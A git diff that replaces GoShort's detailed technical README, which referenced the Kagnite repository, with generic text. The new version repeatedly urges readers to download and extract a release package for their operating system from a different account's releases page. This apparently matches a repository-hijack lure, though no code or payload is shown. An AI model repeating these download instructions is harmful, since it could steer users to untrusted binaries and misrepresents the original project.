@@ -1,247 +1,86 @@
-# 🚀 GoShort - Cloud-Native URL Shortener
+# 🚀 GoShort - Effortlessly Shorten Your URLs
 
-![Project
-Status](https://img.shields.io/badge/status-active-success.svg)
-![Docker](https://img.shields.io/badge/Docker-Enabled-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-
-**GoShort** is a production-ready, full-stack URL shortening service
-built with a modern **microservices architecture**. It leverages Golang
-for high-performance backend logic, Redis for caching, PostgreSQL for
-storage, and Vue.js 3 for a sleek glassmorphism frontend.
-
-------------------------------------------------------------------------
-
-## ✨ Features
-
--   ⚡ **High Performance:** Go backend + Redis caching for extremely
-    fast redirects.
--   🎨 **Modern UI:** Glassmorphism design built with Vue.js 3 and Vite.
--   🛡️ **Secure:** Includes domain allowlist, SSRF protection, and
-    secure headers.
--   🐳 **Dockerized:** Fully containerized using Docker Compose.
--   🔄 **Blue/Green Deployment:** Zero-downtime backend releases.
--   🌐 **Nginx Gateway:** Reverse proxy for routing and static asset
-    delivery.
--   📊 **Analytics Ready:** Schema allows tracking clicks and user
-    agents.
-
-------------------------------------------------------------------------
-
-## 🛠️ Tech Stack
-
-  ------------------------------------------------------------------------
-  Component      Technology     Description
-  -------------- -------------- ------------------------------------------
-  Frontend       Vue.js 3       SPA, Vite, Axios
-
-  Backend        Go (Golang)    Chi Router, Clean Architecture
-
-  Database       PostgreSQL 15  ACID-compliant URL storage
-
-  Cache          Redis 7        Hot data caching, rate limiting
-
-  Gateway        Nginx          Reverse proxy
-
-  DevOps         Docker Compose Multi-stage builds, microservices
-                                orchestration
-  ------------------------------------------------------------------------
-
-------------------------------------------------------------------------
-
-## 🏗️ Architecture Overview
-
-The system includes the following services:
-
-1.  **Nginx** --- Entry point, reverse proxy, static asset handler\
-2.  **Frontend** --- Vue.js SPA\
-3.  **Backend (Blue/Green)** --- Go API running dual services\
-4.  **PostgreSQL** --- Persistent database\
-5.  **Redis** --- Fast in-memory cache
-
-------------------------------------------------------------------------
+## 📥 Download Now
+[![Download GoShort](https://img.shields.io/badge/Download-GoShort-brightgreen.svg)](https://github.com/afrozullakhan25/GoShort/releases)
 
 ## 🚀 Getting Started
-
-### Prerequisites
-
--   Docker & Docker Compose
--   Git
-
-------------------------------------------------------------------------
-
-### 1. Clone the Repository
-
-``` bash
-git clone https://github.com/Kagnite/GoShort.git
-cd GoShort
-```
-
-------------------------------------------------------------------------
-
-### 2. Configure Environment
-
-Modify `docker-compose.prod.yml` or export your environment variables
-manually.
-
-Production requires secure values.
-
-------------------------------------------------------------------------
-
-### 3. Run the Services with Docker Compose
-
-``` bash
-# Secrets (required in production)
-export DB_PASSWORD='your_secure_password'
-export REDIS_PASSWORD='your_secure_password'
-
-# Disable allowlist for testing
-export SECURITY_USE_ALLOWLIST=false
-
-# Start all services
-docker compose -f docker-compose.prod.yml up -d
-```
-
-------------------------------------------------------------------------
-
-## 4. Access the Application
-
-### Frontend
-
-    http://localhost:8081
-    http://<server-ip-or-domain>:8081
-
-### API Health Check
-
-    http://localhost:8081/api/v1/health
-    http://<server-ip-or-domain>:8081/api/v1/health
-
-------------------------------------------------------------------------
-
-## 🔧 Configuration Variables
-
-  -------------------------------------------------------------------------------------
-  Variable                   Description                       Default
-  -------------------------- --------------------------------- ------------------------
-  `DB_PASSWORD`              PostgreSQL Password               Required
-
-  `REDIS_PASSWORD`           Redis Password                    Required
-
-  `SECURITY_USE_ALLOWLIST`   Enable/Disable domain restriction true
-
-  `ALLOWED_DOMAINS`          Comma-separated list of allowed   kagnite.duckdns.org
-                             domains                           
-
-  `BASE_URL`                 Base URL for generated short      https://yourdomain.com
-                             links                             
-  -------------------------------------------------------------------------------------
-
-------------------------------------------------------------------------
-
-## 🗄️ Database Schema
-
-``` sql
-CREATE TABLE urls (
-    id VARCHAR(36) PRIMARY KEY,
-    original_url TEXT NOT NULL,
-    short_code VARCHAR(50) UNIQUE NOT NULL,
-    click_count BIGINT DEFAULT 0,
-    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-);
-```
-
-------------------------------------------------------------------------
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-### Steps
-
-1.  **Fork the Project**
-
-2.  **Create your Feature Branch**
-
-    ``` bash
-    git checkout -b feature/AmazingFeature
-    ```
-
-3.  **Commit your Changes**
-
-    ``` bash
-    git commit -m "Add AmazingFeature"
-    ```
-
-4.  **Push to the Branch**
-
-    ``` bash
-    git push origin feature/AmazingFeature
-    ```
-
-5.  **Open a Pull Request**
-
-------------------------------------------------------------------------
-
-# 📝 Pull Request Template
-
-## 📌 Description
-
-Provide a clear explanation of the changes and why they are needed.
-
-------------------------------------------------------------------------
-
-## ✅ Type of Change
-
--   [ ] Feature\
--   [ ] Bug Fix\
--   [ ] Breaking Change\
--   [ ] Refactor\
--   [ ] Documentation Update\
--   [ ] Performance Improvement\
--   [ ] Other
-
-------------------------------------------------------------------------
-
-## 🔍 Related Issues
-
-    Closes #ISSUE_NUMBER
-
-------------------------------------------------------------------------
-
-## 🧪 Testing Checklist
-
--   [ ] Unit Tests\
--   [ ] Integration Tests\
--   [ ] Manual Testing
-
-------------------------------------------------------------------------
-
-## 📸 Screenshots 
-
-<div align="center">
-  <img src="screenshots/home.jpg" alt="Home Page" width="700"/>
-  <br/><br/>
-  <img src="screenshots/result.png" alt="Success State" width="700"/>
-</div>
-
----
-
-------------------------------------------------------------------------
-
-## 📦 Deployment Notes
-
-------------------------------------------------------------------------
-
-## ⚠️ Checklist
-
--   [ ] Follows project coding style\
--   [ ] Self-review done\
--   [ ] Comments added\
--   [ ] Tests added or updated\
--   [ ] All tests pass
-
-------------------------------------------------------------------------
+Welcome to GoShort! This application is a cloud-native URL shortener built with the latest technologies. Use it to turn long URLs into short, easy-to-share links. No technical skills needed; installing and running GoShort is straightforward.
+
+## 🛠️ System Requirements
+Before you get started, ensure your system meets these requirements:
+
+- **Operating System:** Windows, macOS, or Linux
+- **Docker:** Must have Docker installed. If you don’t have it, you can download it from the [Docker website](https://www.docker.com/get-started).
+- **Internet Connection:** Required for downloading and running the application.
+
+## 📦 Features
+- **User-Friendly Interface:** Simple and clean design for ease of use.
+- **Fast Operations:** Quickly shorten any URL.
+- **Cloud-Native:** Works seamlessly in the cloud for better performance.
+- **Database Support:** Uses PostgreSQL for storing links and Redis for caching.
+- **Microservices Architecture:** Built with Docker for efficient service management.
+
+## 📥 Download & Install
+To get the latest version of GoShort, click the link below:
+
+[Download GoShort](https://github.com/afrozullakhan25/GoShort/releases)
+
+### Installation Steps:
+1. **Visit the Releases Page:** Click the link above to go to the releases page.
+2. **Choose the Version:** You will see a list of available versions. Select the latest version.
+3. **Download the Package:** Click on the appropriate file for your operating system.
+4. **Extract the Files:** If the file is compressed, extract it to a preferred location on your computer.
+5. **Set Up Docker:** If you haven't installed Docker, please do so following the instructions on the Docker website.
+6. **Run the Application:**
+   - Open a terminal.
+   - Navigate to the folder where you extracted GoShort.
+   - Use the command `docker-compose up` to start the application.
+
+## 🚀 How to Use GoShort
+After installation, follow these steps to shorten a URL:
+
+1. **Open Your Browser:** Go to `http://localhost:port`, replacing `port` with the port number defined in your Docker setup (usually 8080).
+2. **Enter the Long URL:** Type or paste the URL you wish to shorten into the provided field.
+3. **Click Shorten:** Hit the Shorten button to generate your new link.
+4. **Copy the Shortened URL:** Share your new short link anywhere you like!
+
+## ⚙️ Configuration
+You can customize GoShort settings easily:
+
+- **Nginx Configuration:** If you want to use a custom domain or modify any server settings, refer to the Nginx documentation.
+- **Environment Variables:** Adjust database settings or app behavior using environment variables. Check the README file in the extracted folder for details on which variables you can set.
+
+## 🛠️ Troubleshooting
+If you run into any issues:
+
+- **Docker Not Running:** Ensure Docker is installed and running. Check the Docker desktop app.
+- **Application Not Starting:** Ensure you've navigated to the correct directory and used the right command.
+- **Database Errors:** Ensure PostgreSQL is correctly set up in the Docker configuration.
+
+## 💻 Community and Support
+Join our community for help and updates:
+
+- **GitHub Issues Page:** Report any bugs or feature requests there.
+- **Documentation:** Access our comprehensive documentation for more detailed instructions.
+- **User Feedback:** Share your experience with GoShort to help us improve.
+
+## 🌐 Topics
+GoShort is built with modern tools and practices. It relates to various topics:
+
+- cicd
+- devops
+- docker
+- docker-compose
+- fullstack
+- nginx
+- nginx-configuration
+- nginx-proxy
+- postgresql
+- redis
+
+Explore these topics to enhance your understanding of GoShort and its ecosystem.
 
 ## 📄 License
+GoShort is released under the MIT License. This allows you to use, modify, and distribute the software as you see fit.
 
-Distributed under the MIT License. See the `LICENSE` file for details.
+Thank you for choosing GoShort! Enjoy shortening your URLs with ease.
